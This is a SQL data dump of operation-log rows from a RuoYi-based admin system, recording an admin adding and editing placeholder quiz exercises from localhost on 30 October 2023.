INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (262, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:28:45\",\"exerciseProgram\":\"<p>asdasd</p>\",\"id\":35,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":35}', 0, NULL, '2023-10-30 16:28:45', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (263, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 17:52:28\",\"exerciseProgram\":\"<p>asdasdas</p>\",\"id\":36,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":36}', 0, NULL, '2023-10-30 17:52:28', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (264, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:01:23\",\"exerciseProgram\":\"\",\"id\":37,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":37}', 0, NULL, '2023-10-30 18:01:23', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (265, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:02:22\",\"exerciseProgram\":\"<p>asdasd</p>\",\"id\":38,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":38}', 0, NULL, '2023-10-30 18:02:22', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (266, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asdasdasd</p>\",\"id\":38,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 18:02:30\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 18:02:30', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (267, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:11:18\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":39,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":39}', 0, NULL, '2023-10-30 18:11:18', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (268, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:12:32\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":40,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":40}', 0, NULL, '2023-10-30 18:12:32', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (269, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:16:53\",\"exerciseProgram\":\"<p>asda</p>\",\"id\":41,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":41}', 0, NULL, '2023-10-30 18:16:53', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (270, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:17:25\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":42,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":42}', 0, NULL, '2023-10-30 18:17:25', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (271, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:22:18\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":43,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":43}', 0, NULL, '2023-10-30 18:22:18', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (272, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:25:07\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":44,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":44}', 0, NULL, '2023-10-30 18:25:07', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (273, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:26:46\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":45,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":45}', 0, NULL, '2023-10-30 18:26:46', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (274, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:29:43\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":46,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":46}', 0, NULL, '2023-10-30 18:29:44', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (275, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:33:03\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":47,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":47}', 0, NULL, '2023-10-30 18:33:03', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (276, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:36:24\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":48,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":48}', 0, NULL, '2023-10-30 18:36:24', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (277, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:39:24\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":49,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":49}', 0, NULL, '2023-10-30 18:39:24', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (278, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"exerciseTitle\":\"<p>asd</p>\",\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 18:39:43\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-30 18:39:43', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (279, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"exerciseTitle\":\"<p>asd</p>\",\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 18:40:04\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-30 18:40:04', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (280, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:42:01\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":50,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":50}', 0, NULL, '2023-10-30 18:42:01', 66);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (281, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:42:31\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":51,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":51}', 0, NULL, '2023-10-30 18:42:31', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (282, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:43:46\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":52,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":52}', 0, NULL, '2023-10-30 18:43:46', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (283, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"asd\",\"choiceB\":\"ads\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"exerciseTitle\":\"<p>asd</p>\",\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 18:44:03\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-30 18:44:03', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (284, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:44:53\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":53,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":53}', 0, NULL, '2023-10-30 18:44:53', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (285, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"das\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"exerciseTitle\":\"<p>asd</p>\",\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 18:45:05\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-30 18:45:05', 13);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (286, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:46:49\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":54,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":54}', 0, NULL, '2023-10-30 18:46:50', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (287, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:47:56\",\"exerciseProgram\":\"<p>asdasdas</p>\",\"id\":55,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":55}', 0, NULL, '2023-10-30 18:47:56', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (288, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"asd\",\"choiceB\":\"ads\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:48:08\",\"exerciseTitle\":\"<p>asd</p>\",\"id\":56,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":56}', 0, NULL, '2023-10-30 18:48:08', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (289, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"asd\",\"choiceB\":\"ads\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:48:27\",\"exerciseTitle\":\"<p>asd</p>\",\"id\":57,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":57}', 0, NULL, '2023-10-30 18:48:27', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (290, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"ads\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:48:35\",\"exerciseTitle\":\"<p>asd</p>\",\"id\":58,\"params\":{},\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":58}', 0, NULL, '2023-10-30 18:48:35', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (291, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:52:55\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":59,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":59}', 0, NULL, '2023-10-30 18:52:55', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (292, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:53:25\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":60,\"params\":{},\"parentId\":-1,\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":60}', 0, NULL, '2023-10-30 18:53:25', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (293, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:54:05\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":61,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":61}', 0, NULL, '2023-10-30 18:54:05', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (294, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:54:35\",\"exerciseTitle\":\"<p>e</p>\",\"exerciseType\":-1,\"id\":62,\"params\":{},\"parentId\":-1,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":62}', 0, NULL, '2023-10-30 18:54:35', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (295, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:54:42\",\"exerciseProgram\":\"<p>qwe</p>\",\"id\":63,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":63}', 0, NULL, '2023-10-30 18:54:42', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (296, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"qwe\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:54:47\",\"exerciseTitle\":\"<p>qwe</p>\",\"exerciseType\":-1,\"id\":64,\"params\":{},\"parentId\":-1,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":64}', 0, NULL, '2023-10-30 18:54:47', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (297, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:57:19\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":65,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":65}', 0, NULL, '2023-10-30 18:57:19', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (298, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 18:57:46\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":66,\"params\":{},\"parentId\":65,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":66}', 0, NULL, '2023-10-30 18:57:46', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (299, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:00:18\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":67,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":67}', 0, NULL, '2023-10-30 19:00:18', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (300, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"ad\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:00:32\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":68,\"params\":{},\"parentId\":67,\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":68}', 0, NULL, '2023-10-30 19:00:32', 23);
